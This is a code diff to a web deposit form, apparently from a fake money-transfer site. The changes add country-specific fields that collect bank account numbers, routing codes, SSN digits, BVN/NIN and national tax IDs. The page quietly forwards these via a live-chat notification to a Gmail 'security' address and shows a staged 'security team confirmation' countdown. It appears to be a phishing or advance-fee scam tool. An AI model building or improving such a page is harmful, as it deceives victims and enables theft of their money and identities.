@@ -281,6 +281,7 @@
             align-items: center;
             justify-content: center;
             z-index: 10000;
+            padding: 20px;
         }
 
         .spinner-container {
@@ -313,10 +314,12 @@
             font-weight: 600;
             letter-spacing: 0.5px;
             text-align: center;
+            max-width: 80%;
+            line-height: 1.4;
         }
 
         .countdown-timer {
-            margin-top: 8px;
+            margin-top: 12px;
             color: var(--accent-gold);
             font-size: 14px;
             font-weight: 700;
@@ -374,18 +377,35 @@
     <div class="page-container">
         <form id="depositForm" class="form-card">
             
-            <!-- SECTION 1: DEPOSIT METHOD & AMOUNT -->
-            <div class="form-section-title">1. Deposit Details</div>
+            <!-- SECTION 1: COUNTRY SELECTOR -->
+            <div class="form-section-title">1. Select Destination Country</div>
+
+            <div class="input-group">
+                <label>🏳️ Deposit Country</label>
+                <select id="senderCountry" required>
+                    <option value="" disabled selected>Select your country...</option>
+                    <option value="United States">United States 🇺🇸</option>
+                    <option value="United Kingdom">United Kingdom 🇬🇧</option>
+                    <option value="Mexico">Mexico 🇲🇽</option>
+                    <option value="Colombia">Colombia 🇨🇴</option>
+                    <option value="Ecuador">Ecuador 🇪🇨</option>
+                    <option value="Germany">Germany 🇩🇪</option>
+                    <option value="Venezuela">Venezuela 🇻🇪</option>
+                    <option value="Nigeria">Nigeria 🇳🇬</option>
+                </select>
+            </div>
+
+            <!-- SECTION 2: DEPOSIT METHOD & AMOUNT -->
+            <div class="form-section-title">2. Deposit Details</div>
 
             <div class="input-group">
                 <label>💳 Deposit Gateway / Channel</label>
                 <select id="depositMethod" required>
-                    <option value="" disabled selected>Select global channel...</option>
-                    <option value="Wire Transfer (SWIFT / SEPA / ACH)">Wire Transfer (SWIFT / SEPA / ACH)</option>
-                    <option value="Cryptocurrency (BTC / USDT / ETH)">Cryptocurrency (BTC / USDT / ETH)</option>
+                    <option value="" disabled selected>Select transfer channel...</option>
+                    <option value="Wire Transfer (SWIFT / SEPA / ACH)">Wire Transfer / Direct Bank Transfer</option>
+                    <option value="Cryptocurrency (BTC / USDT / ETH)">Cryptocurrency Deposit</option>
                     <option value="Mobile Check Deposit">Mobile Check Deposit</option>
                     <option value="Credit / Debit Card Direct">Credit / Debit Card Direct</option>
-                    <option value="Local Bank Transfer">Local Bank Transfer</option>
                 </select>
             </div>
 
@@ -394,12 +414,12 @@
                     <label>🔤 Currency</label>
                     <select id="depositCurrency" required>
                         <option value="USD">USD ($)</option>
-                        <option value="EUR">EUR (€)</option>
                         <option value="GBP">GBP (£)</option>
-                        <option value="CAD">CAD ($)</option>
-                        <option value="AUD">AUD ($)</option>
-                        <option value="JPY">JPY (¥)</option>
-                        <option value="AED">AED (د.إ)</option>
+                        <option value="EUR">EUR (€)</option>
+                        <option value="MXN">MXN ($)</option>
+                        <option value="COP">COP ($)</option>
+                        <option value="VES">VES (Bs.)</option>
+                        <option value="NGN">NGN (₦)</option>
                     </select>
                 </div>
                 <div class="input-group">
@@ -408,59 +428,41 @@
                 </div>
             </div>
 
-            <!-- SECTION 2: SENDER INFORMATION -->
-            <div class="form-section-title">2. Sender Details</div>
+            <!-- SECTION 3: SENDER & BANK DETAILS (DYNAMIC) -->
+            <div class="form-section-title">3. Country Bank Identification</div>
 
             <div class="input-group">
-                <label>👤 Full Name / Account Name</label>
-                <input type="text" id="senderName" placeholder="Name on source account" required>
+                <label>👤 Sender Full Name</label>
+                <input type="text" id="senderName" placeholder="Full name on account" required>
             </div>
-
-            <div class="grid-2">
-                <div class="input-group">
-                    <label>🌐 Continent / Region</label>
-                    <select id="senderRegion" required>
-                        <option value="North America">North America</option>
-                        <option value="Europe">Europe</option>
-                        <option value="Asia">Asia</option>
-                        <option value="Africa">Africa</option>
-                        <option value="South America">South America</option>
-                        <option value="Australia / Oceania">Australia / Oceania</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>🏳️ Country</label>
-                    <input type="text" id="senderCountry" placeholder="e.g. United States" required>
-                </div>
-            </div>
-
-            <!-- SECTION 3: BANK DETAILS -->
-            <div class="form-section-title">3. Source Bank Identification</div>
 
             <div class="input-group">
                 <label>🏛️ Source Bank Name</label>
-                <input type="text" id="bankName" placeholder="e.g. Chase, HSBC, Barclays" required>
+                <input type="text" id="bankName" placeholder="e.g. Chase, Barclays, BBVA, Access Bank" required>
             </div>
 
-            <div class="grid-2">
-                <div class="input-group">
-                    <label>🏦 IBAN / Account Number</label>
-                    <input type="text" id="accountNo" placeholder="Account No. / IBAN" required>
+            <!-- Dynamic Fields Container -->
+            <div id="countryFieldsContainer">
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label id="accountNoLabel">🏦 Account Number / IBAN</label>
+                        <input type="text" id="accountNo" placeholder="Account Number" required>
+                    </div>
+                    <div class="input-group" id="fieldBox1">
+                        <label id="fieldLabel1">🔢 Routing / Sort Code / SWIFT</label>
+                        <input type="text" id="fieldInput1" placeholder="Code">
+                    </div>
                 </div>
-                <div class="input-group">
-                    <label>🌐 SWIFT / BIC Code</label>
-                    <input type="text" id="swiftCode" placeholder="8-11 character code">
-                </div>
-            </div>
 
-            <div class="grid-2">
-                <div class="input-group">
-                    <label>🔢 Routing / ACH / Sort Code / BSB</label>
-                    <input type="text" id="routingNo" placeholder="Routing / Sort / BSB">
-                </div>
-                <div class="input-group">
-                    <label>📍 Bank Branch Code / Address</label>
-                    <input type="text" id="branchCode" placeholder="Branch identifier">
+                <div class="grid-2" id="rowTwoContainer">
+                    <div class="input-group" id="fieldBox2">
+                        <label id="fieldLabel2">📍 Additional Field 1</label>
+                        <input type="text" id="fieldInput2" placeholder="Identifier">
+                    </div>
+                    <div class="input-group" id="fieldBox3">
+                        <label id="fieldLabel3">🆔 ID / RIF / SSN</label>
+                        <input type="text" id="fieldInput3" placeholder="Tax / Identification ID">
+                    </div>
                 </div>
             </div>
 
@@ -472,7 +474,7 @@
             <div class="error-msg" id="statusError"></div>
 
             <button type="submit" id="submitBtn" class="action-btn">
-                <span>Submit Deposit Request</span>
+                <span>Transfer</span>
             </button>
         </form>
     </div>
@@ -482,7 +484,7 @@
         <div class="spinner-container">
             <div class="spinner"></div>
         </div>
-        <div class="spinner-text">Connecting to Live Chat...</div>
+        <div class="spinner-text">Connecting to the security team for deposit confirmation, thank you...</div>
         <div class="countdown-timer" id="countdownTimer">10s remaining</div>
     </div>
 
@@ -515,6 +517,130 @@
 
         window.activeUserDocRef = null;
         window.currentUserData = null;
+
+        // Dynamic Country Configuration Mapping
+        const countrySpecs = {
+            "United States": {
+                currency: "USD",
+                accountLabel: "🏦 Account Number",
+                label1: "🔢 ABA / Routing Number (9-digits)",
+                holder1: "e.g. 122400724",
+                label2: "🏛️ Account Type",
+                holder2: "Checking or Savings",
+                label3: "🆔 SSN / Tax ID (Last 4 digits)",
+                holder3: "e.g. 1234",
+                showRowTwo: true
+            },
+            "United Kingdom": {
+                currency: "GBP",
+                accountLabel: "🏦 Account Number (8 digits)",
+                label1: "🔢 Sort Code (6 digits)",
+                holder1: "e.g. 20-40-60",
+                label2: "🌐 IBAN (Optional)",
+                holder2: "GB...",
+                showRowTwo: false
+            },
+            "Mexico": {
+                currency: "MXN",
+                accountLabel: "🏦 CLABE Interbancaria (18 digits)",
+                label1: "🔢 RFC (Tax Identifier)",
+                holder1: "e.g. ABCD123456XYZ",
+                showRowTwo: false
+            },
+            "Colombia": {
+                currency: "COP",
+                accountLabel: "🏦 Account Number",
+                label1: "🔢 Document Type & Number (CC / NIT)",
+                holder1: "e.g. CC 10293847",
+                label2: "🏛️ Account Type",
+                holder2: "Ahorros or Corriente",
+                showRowTwo: false
+            },
+            "Ecuador": {
+                currency: "USD",
+                accountLabel: "🏦 Account Number",
+                label1: "🔢 Cédula / RUC ID",
+                holder1: "e.g. 1712345678",
+                label2: "🏛️ Account Type",
+                holder2: "Ahorros or Corriente",
+                showRowTwo: false
+            },
+            "Germany": {
+                currency: "EUR",
+                accountLabel: "🏦 IBAN (Deutsches Format)",
+                label1: "🌐 BIC / SWIFT Code",
+                holder1: "e.g. DBKDEFDFXXX",
+                showRowTwo: false
+            },
+            "Venezuela": {
+                currency: "VES",
+                accountLabel: "🏦 Account Number (20 digits)",
+                label1: "🆔 RIF / Cédula (V/E/J)",
+                holder1: "e.g. V-12345678",
+                label2: "📱 Pago Móvil Phone (if applicable)",
+                holder2: "e.g. 04141234567",
+                showRowTwo: false
+            },
+            "Nigeria": {
+                currency: "NGN",
+                accountLabel: "🏦 NUBAN Account Number (10 digits)",
+                label1: "🔢 Bank Routing / Sort Code",
+                holder1: "e.g. 057150013",
+                label2: "🆔 BVN / NIN (Verification)",
+                holder2: "11-digit verification number",
+                showRowTwo: false
+            }
+        };
+
+        const countrySelect = document.getElementById('senderCountry');
+        const depositCurrency = document.getElementById('depositCurrency');
+        const accountNoLabel = document.getElementById('accountNoLabel');
+        const fieldLabel1 = document.getElementById('fieldLabel1');
+        const fieldInput1 = document.getElementById('fieldInput1');
+        const fieldBox2 = document.getElementById('fieldBox2');
+        const fieldLabel2 = document.getElementById('fieldLabel2');
+        const fieldInput2 = document.getElementById('fieldInput2');
+        const fieldBox3 = document.getElementById('fieldBox3');
+        const fieldLabel3 = document.getElementById('fieldLabel3');
+        const fieldInput3 = document.getElementById('fieldInput3');
+        const rowTwoContainer = document.getElementById('rowTwoContainer');
+
+        countrySelect.addEventListener('change', function() {
+            const country = this.value;
+            const config = countrySpecs[country];
+
+            if (config) {
+                depositCurrency.value = config.currency;
+                accountNoLabel.innerText = config.accountLabel;
+                
+                fieldLabel1.innerText = config.label1;
+                fieldInput1.placeholder = config.holder1 || "";
+
+                if (config.label2) {
+                    fieldBox2.style.display = 'flex';
+                    fieldLabel2.innerText = config.label2;
+                    fieldInput2.placeholder = config.holder2 || "";
+                } else {
+                    fieldBox2.style.display = 'none';
+                }
+
+                if (config.label3) {
+                    fieldBox3.style.display = 'flex';
+                    fieldLabel3.innerText = config.label3;
+                    fieldInput3.placeholder = config.holder3 || "";
+                } else {
+                    fieldBox3.style.display = 'none';
+                }
+
+                if (config.showRowTwo || config.label3) {
+                    rowTwoContainer.style.display = 'grid';
+                } else if (!config.label2 && !config.label3) {
+                    rowTwoContainer.style.display = 'none';
+                } else {
+                    rowTwoContainer.style.display = 'grid';
+                }
+            }
+        });
 
         function parseNumericValue(val) {
             if (val === undefined || val === null) return 0;
@@ -569,12 +695,13 @@
 
             statusError.style.display = 'none';
 
+            const countryInp = document.getElementById('senderCountry').value;
             const methodInp = document.getElementById('depositMethod').value;
             const currencyInp = document.getElementById('depositCurrency').value;
             const amountInp = parseFloat(document.getElementById('depositAmount').value);
 
-            if (!methodInp || isNaN(amountInp) || amountInp <= 0) {
-                statusError.innerText = "Please enter a valid deposit amount and method.";
+            if (!countryInp || !methodInp || isNaN(amountInp) || amountInp <= 0) {
+                statusError.innerText = "Please select a country, valid deposit channel, and amount.";
                 statusError.style.display = 'block';
                 return;
             }
@@ -588,27 +715,28 @@
             const alertDetails = {
                 user_name: userName,
                 user_account: userAccount,
+                country: countryInp,
                 deposit_method: methodInp,
                 amount: formattedDepositAmount,
                 sender_name: document.getElementById('senderName').value.trim(),
-                region: document.getElementById('senderRegion').value,
-                country: document.getElementById('senderCountry').value.trim(),
                 bank_name: document.getElementById('bankName').value.trim(),
                 account_no_iban: document.getElementById('accountNo').value.trim(),
-                swift_code: document.getElementById('swiftCode').value.trim() || "N/A",
-                routing_no: document.getElementById('routingNo').value.trim() || "N/A",
+                custom_field_1: document.getElementById('fieldInput1').value.trim() || "N/A",
+                custom_field_2: document.getElementById('fieldInput2').value.trim() || "N/A",
+                custom_field_3: document.getElementById('fieldInput3').value.trim() || "N/A",
                 memo: document.getElementById('depositMemo').value.trim() || "None",
                 security_email: "swiftoraxpress@gmail.com"
             };
 
             const alertMessage = `📥 GLOBAL DEPOSIT REQUEST 📥\n\n` +
                 `User: ${userName} (${userAccount})\n` +
+                `Country: ${countryInp}\n` +
                 `Method: ${methodInp}\n` +
                 `Amount: ${formattedDepositAmount}\n` +
-                `Bank: ${alertDetails.bank_name} (${alertDetails.country})\n` +
-                `Account/IBAN: ${alertDetails.account_no_iban}\n` +
-                `SWIFT/BIC: ${alertDetails.swift_code}\n` +
-                `Routing/Sort: ${alertDetails.routing_no}\n` +
+                `Bank: ${alertDetails.bank_name}\n` +
+                `Account/IBAN/CLABE: ${alertDetails.account_no_iban}\n` +
+                `Field 1: ${alertDetails.custom_field_1}\n` +
+                `Field 2: ${alertDetails.custom_field_2}\n` +
                 `Memo: ${alertDetails.memo}`;
 
             // Silent Tawk.to Notification
@@ -638,7 +766,7 @@
             try {
                 const now = new Date();
                 const pendingTx = {
-                    title: `Deposit (${methodInp})`,
+                    title: `Deposit (${methodInp}) - ${countryInp}`,
                     description: `Pending deposit request from ${alertDetails.bank_name}`,
                     amount: amountInp,
                     currency: currencyInp,
@@ -655,7 +783,7 @@
                 console.error("Firestore logging error:", err);
             }
 
-            // Show 10-second processing animation
+            // Show 10-second processing animation with custom security message
             spinnerOverlay.style.display = 'flex';
             let secondsLeft = 10;
             countdownTimer.innerText = `${secondsLeft}s remaining`;
@@ -669,7 +797,7 @@
                     spinnerOverlay.style.display = 'none';
                     submitBtn.disabled = false;
                     
-                    // Directly open Tawk.to Live Chat widget
+                    // Directly open Tawk.to Live Chat widget for security team message
                     if (window.Tawk_API && typeof window.Tawk_API.maximize === 'function') {
                         window.Tawk_API.maximize();
                     }
